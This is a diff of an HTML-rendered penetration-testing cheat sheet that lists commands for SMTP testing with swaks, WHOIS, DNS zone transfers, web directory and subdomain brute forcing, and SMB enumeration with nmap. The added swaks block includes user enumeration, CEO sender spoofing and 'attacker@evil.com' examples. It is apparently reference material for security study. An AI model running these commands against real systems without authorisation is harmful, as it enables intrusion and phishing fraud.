+<div class="language-sh highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1"># Basic SMTP connectivity test</span>
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com
+</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>
+</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="c1"># Specify SMTP port</span>
+</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--port<span class="w"> </span><span class="m">25</span>
+</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--port<span class="w"> </span><span class="m">587</span>
+</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--port<span class="w"> </span><span class="m">465</span><span class="w"> </span>--tls-on-connect
+</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>
+</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="c1"># Enumerate users via RCPT TO</span>
+</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>swaks<span class="w"> </span>--to<span class="w"> </span>test@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--quit-after<span class="w"> </span>RCPT
+</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a>
+</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="c1"># Manual MAIL FROM / RCPT TO control</span>
+</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a>swaks<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--mail-from<span class="w"> </span>attacker@evil.com<span class="w"> </span>--to<span class="w"> </span>victim@target.com
+</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a>
+</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="c1"># Test SMTP AUTH (LOGIN)</span>
+</span><span id="__span-31-16"><a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--auth<span class="w"> </span>LOGIN<span class="w"> </span>--auth-user<span class="w"> </span>user<span class="w"> </span>--auth-password<span class="w"> </span>pass
+</span><span id="__span-31-17"><a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a>
+</span><span id="__span-31-18"><a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a><span class="c1"># Test SMTP AUTH (PLAIN)</span>
+</span><span id="__span-31-19"><a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--auth<span class="w"> </span>PLAIN<span class="w"> </span>--auth-user<span class="w"> </span>user<span class="w"> </span>--auth-password<span class="w"> </span>pass
+</span><span id="__span-31-20"><a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a>
+</span><span id="__span-31-21"><a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a><span class="c1"># Spoof sender address</span>
+</span><span id="__span-31-22"><a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--from<span class="w"> </span>ceo@target.com<span class="w"> </span>--server<span class="w"> </span>target.com
+</span><span id="__span-31-23"><a id="__codelineno-31-23" name="__codelineno-31-23" href="#__codelineno-31-23"></a>
+</span><span id="__span-31-24"><a id="__codelineno-31-24" name="__codelineno-31-24" href="#__codelineno-31-24"></a><span class="c1"># Custom email body</span>
+</span><span id="__span-31-25"><a id="__codelineno-31-25" name="__codelineno-31-25" href="#__codelineno-31-25"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--from<span class="w"> </span>attacker@evil.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--data<span class="w"> </span><span class="s2">"Subject: Test\n\nBody text"</span>
+</span><span id="__span-31-26"><a id="__codelineno-31-26" name="__codelineno-31-26" href="#__codelineno-31-26"></a>
+</span><span id="__span-31-27"><a id="__codelineno-31-27" name="__codelineno-31-27" href="#__codelineno-31-27"></a><span class="c1"># Attach local file (also try with @ in front of filename)</span>
+</span><span id="__span-31-28"><a id="__codelineno-31-28" name="__codelineno-31-28" href="#__codelineno-31-28"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--attach<span class="w"> </span>file.txt
+</span><span id="__span-31-29"><a id="__codelineno-31-29" name="__codelineno-31-29" href="#__codelineno-31-29"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--attach<span class="w"> </span>@file.txt
+</span><span id="__span-31-30"><a id="__codelineno-31-30" name="__codelineno-31-30" href="#__codelineno-31-30"></a>
+</span><span id="__span-31-31"><a id="__codelineno-31-31" name="__codelineno-31-31" href="#__codelineno-31-31"></a><span class="c1"># Suppress data send (banner / capability recon)</span>
+</span><span id="__span-31-32"><a id="__codelineno-31-32" name="__codelineno-31-32" href="#__codelineno-31-32"></a>swaks<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--quit-after<span class="w"> </span>EHLO
+</span><span id="__span-31-33"><a id="__codelineno-31-33" name="__codelineno-31-33" href="#__codelineno-31-33"></a>
+</span><span id="__span-31-34"><a id="__codelineno-31-34" name="__codelineno-31-34" href="#__codelineno-31-34"></a><span class="c1"># Test open relay</span>
+</span><span id="__span-31-35"><a id="__codelineno-31-35" name="__codelineno-31-35" href="#__codelineno-31-35"></a>swaks<span class="w"> </span>--to<span class="w"> </span>victim@external.com<span class="w"> </span>--from<span class="w"> </span>spoof@external.com<span class="w"> </span>--server<span class="w"> </span>target.com
+</span><span id="__span-31-36"><a id="__codelineno-31-36" name="__codelineno-31-36" href="#__codelineno-31-36"></a>
+</span><span id="__span-31-37"><a id="__codelineno-31-37" name="__codelineno-31-37" href="#__codelineno-31-37"></a><span class="c1"># Timeout control (avoid hanging)</span>
+</span><span id="__span-31-38"><a id="__codelineno-31-38" name="__codelineno-31-38" href="#__codelineno-31-38"></a>swaks<span class="w"> </span>--to<span class="w"> </span>user@target.com<span class="w"> </span>--server<span class="w"> </span>target.com<span class="w"> </span>--timeout<span class="w"> </span><span class="m">5</span>
 </span></code></pre></div>
 <h4 id="whois-tcp-43">WHOIS (TCP: 43)<a class="headerlink" href="#whois-tcp-43" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>whois<span class="w"> </span>DOMAIN
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>whois<span class="w"> </span>IP
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>whois<span class="w"> </span>DOMAIN
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>whois<span class="w"> </span>IP
 </span></code></pre></div>
 <h4 id="dns-tcp-53">DNS (TCP: 53)<a class="headerlink" href="#dns-tcp-53" title="Permanent link">¶</a></h4>
 <h5 id="lookup">Lookup<a class="headerlink" href="#lookup" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># Linux</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>host<span class="w"> </span>DOMAIN
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>host<span class="w"> </span>-t<span class="w"> </span>txt<span class="w"> </span>DOMAIN
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c1"># Windows</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>nslookup<span class="w"> </span>DOMAIN
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>nslookup<span class="w"> </span>-type<span class="o">=</span>TXT<span class="w"> </span>DOMAIN<span class="w"> </span>IP
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Linux</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>host<span class="w"> </span>DOMAIN
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>host<span class="w"> </span>-t<span class="w"> </span>txt<span class="w"> </span>DOMAIN
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1"># Windows</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>nslookup<span class="w"> </span>DOMAIN
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>nslookup<span class="w"> </span>-type<span class="o">=</span>TXT<span class="w"> </span>DOMAIN<span class="w"> </span>IP
 </span></code></pre></div>
 <h5 id="zone-transfer">Zone transfer<a class="headerlink" href="#zone-transfer" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Attempt a Zone Transfer manually </span>
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>host<span class="w"> </span>-l<span class="w"> </span>DOMAIN<span class="w"> </span>ns1.DOMAIN
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="c1"># Automated Zone Transfer check with DNSRecon</span>
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-t<span class="w"> </span>axfr
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="c1"># Find SRV records (often points to AD Domain Controllers/SIP/LDAP)</span>
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>host<span class="w"> </span>-t<span class="w"> </span>SRV<span class="w"> </span>_ldap._tcp.DOMAIN
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="c1"># Attempt a Zone Transfer manually </span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>host<span class="w"> </span>-l<span class="w"> </span>DOMAIN<span class="w"> </span>ns1.DOMAIN
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="c1"># Automated Zone Transfer check with DNSRecon</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-t<span class="w"> </span>axfr
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="c1"># Find SRV records (often points to AD Domain Controllers/SIP/LDAP)</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a>host<span class="w"> </span>-t<span class="w"> </span>SRV<span class="w"> </span>_ldap._tcp.DOMAIN
 </span></code></pre></div>
 <h4 id="https-tcp-80-443">HTTP(S) (TCP: 80, 443)<a class="headerlink" href="#https-tcp-80-443" title="Permanent link">¶</a></h4>
 <h5 id="enumeration_2">Enumeration<a class="headerlink" href="#enumeration_2" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>http://domain/robots.txt
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>http://domain/sitemap.xml
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>CTRL+U<span class="w"> </span><span class="o">(</span>page<span class="w"> </span><span class="nb">source</span><span class="o">)</span>
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>Wappalyzer
-</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a>DevTools<span class="w"> </span>Debugger
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>http://domain/robots.txt
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>http://domain/sitemap.xml
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>CTRL+U<span class="w"> </span><span class="o">(</span>page<span class="w"> </span><span class="nb">source</span><span class="o">)</span>
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>Wappalyzer
+</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a>DevTools<span class="w"> </span>Debugger
 </span></code></pre></div>
 <h5 id="interaction-with-cli-clients">Interaction with CLI clients<a class="headerlink" href="#interaction-with-cli-clients" title="Permanent link">¶</a></h5>
 <p>Different methods to connect to HTTP(S) services via CLI.</p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span>-vv<span class="w"> </span>-d<span class="w"> </span><span class="s1">'{"password":"fake","username":"admin"}'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/json'</span>
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>curl<span class="w"> </span>--data-urlencode
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>wget
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>httpx<span class="w"> </span>&lt;URL&gt;<span class="w"> </span>--download<span class="w"> </span>file.txt
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>curl<span class="w"> </span>--path-as-is<span class="w"> </span>-vv<span class="w"> </span>-d<span class="w"> </span><span class="s1">'{"password":"fake","username":"admin"}'</span><span class="w"> </span>-H<span class="w"> </span><span class="s1">'Content-Type: application/json'</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>curl<span class="w"> </span>--data-urlencode
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>wget
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>httpx<span class="w"> </span>&lt;URL&gt;<span class="w"> </span>--download<span class="w"> </span>file.txt
 </span></code></pre></div>
 <h5 id="directories">Directories<a class="headerlink" href="#directories" title="Permanent link">¶</a></h5>
 <h6 id="gobuster">Gobuster<a class="headerlink" href="#gobuster" title="Permanent link">¶</a></h6>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>IP<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/small.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>gobuster<span class="w"> </span>dir<span class="w"> </span>-u<span class="w"> </span>IP<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/dirb/small.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>
 </span></code></pre></div>
 <h6 id="feroxbuster">Feroxbuster<a class="headerlink" href="#feroxbuster" title="Permanent link">¶</a></h6>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://target.com
-</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>
-</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="c1"># Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)</span>
-</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-x<span class="w"> </span>php,asp,aspx,js,txt,pdf
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://target.com
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="c1"># Scan with custom wordlist and extensions (PHP/ASP/JS common for OSCP)</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://target.com<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-x<span class="w"> </span>php,asp,aspx,js,txt,pdf
 </span></code></pre></div>
 <h6 id="ffuf">FFUF<a class="headerlink" href="#ffuf" title="Permanent link">¶</a></h6>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>ffuf<span class="w"> </span>-recursion<span class="w"> </span>-c<span class="w"> </span>-e<span class="w"> </span><span class="s1">'.htm'</span>,<span class="s1">'.php'</span>,<span class="s1">'.html'</span>,<span class="s1">'.js'</span>,<span class="s1">'.txt'</span>,<span class="s1">'.zip'</span>,<span class="s1">'.bak'</span>,<span class="s1">'.asp'</span>,<span class="s1">'.aspx'</span>,<span class="s1">'.xml'</span><span class="w"> </span>-w<span class="w"> </span>SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt<span class="w"> </span>-u<span class="w"> </span>http://domain.com/FUZZ
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>ffuf<span class="w"> </span>-recursion<span class="w"> </span>-c<span class="w"> </span>-e<span class="w"> </span><span class="s1">'.htm'</span>,<span class="s1">'.php'</span>,<span class="s1">'.html'</span>,<span class="s1">'.js'</span>,<span class="s1">'.txt'</span>,<span class="s1">'.zip'</span>,<span class="s1">'.bak'</span>,<span class="s1">'.asp'</span>,<span class="s1">'.aspx'</span>,<span class="s1">'.xml'</span><span class="w"> </span>-w<span class="w"> </span>SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt<span class="w"> </span>-u<span class="w"> </span>http://domain.com/FUZZ
 </span></code></pre></div>
 <h5 id="subdomains">Subdomains<a class="headerlink" href="#subdomains" title="Permanent link">¶</a></h5>
 <h6 id="manual">Manual<a class="headerlink" href="#manual" title="Permanent link">¶</a></h6>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Look for subdomains using wordlist</span>
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>list.txt<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="nv">$ip</span>.DOMAIN<span class="p">;</span><span class="w"> </span><span class="k">done</span>
-</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="c1"># Look for subdomains using PTR records (reverse DNS)</span>
-</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="m">51</span>.222.169.<span class="nv">$ip</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"not found"</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Look for subdomains using wordlist</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>list.txt<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="nv">$ip</span>.DOMAIN<span class="p">;</span><span class="w"> </span><span class="k">done</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="c1"># Look for subdomains using PTR records (reverse DNS)</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>seq<span class="w"> </span><span class="m">200</span><span class="w"> </span><span class="m">254</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>host<span class="w"> </span><span class="m">51</span>.222.169.<span class="nv">$ip</span><span class="p">;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"not found"</span>
 </span></code></pre></div>
 <h6 id="dnsrecon">DNSRecon<a class="headerlink" href="#dnsrecon" title="Permanent link">¶</a></h6>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Standard scan</span>
-</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-t<span class="w"> </span>std
-</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="c1"># Brute force with wordlist</span>
-</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-D<span class="w"> </span>~/list.txt<span class="w"> </span>-t<span class="w"> </span>brt
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Standard scan</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-t<span class="w"> </span>std
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="c1"># Brute force with wordlist</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-D<span class="w"> </span>~/list.txt<span class="w"> </span>-t<span class="w"> </span>brt
 </span></code></pre></div>
 <h6 id="dnsenum">DNSEnum<a class="headerlink" href="#dnsenum" title="Permanent link">¶</a></h6>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>dnsenum<span class="w"> </span>DOMAIN
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>dnsenum<span class="w"> </span>DOMAIN
 </span></code></pre></div>
 <h6 id="gobuster_1">Gobuster<a class="headerlink" href="#gobuster_1" title="Permanent link">¶</a></h6>
 <p>Can create tailored wordlist using LLM or use SecLists.</p>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>gobuster<span class="w"> </span>dns<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>-w<span class="w"> </span>wordlist.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>
 </span></code></pre></div>
 <h6 id="crtsh">CRT.sh<a class="headerlink" href="#crtsh" title="Permanent link">¶</a></h6>
 <p><a href="https://crt.sh">crt.sh</a></p>
 <h4 id="smb-tcp-139-445">SMB (TCP: 139, 445)<a class="headerlink" href="#smb-tcp-139-445" title="Permanent link">¶</a></h4>
 <h5 id="powershell_2">PowerShell<a class="headerlink" href="#powershell_2" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>net<span class="w"> </span>view<span class="w"> </span><span class="se">\\</span>dc01<span class="w"> </span>/all
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>net<span class="w"> </span>view<span class="w"> </span><span class="se">\\</span>dc01<span class="w"> </span>/all
 </span></code></pre></div>
 <h5 id="nmap_2">Nmap<a class="headerlink" href="#nmap_2" title="Permanent link">¶</a></h5>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1"># SMB + NetBIOS</span>
-</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-v<span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span>IP
-</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>-v<span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span>--script<span class="w"> </span>smb-os-discovery<span class="w"> </span>IP
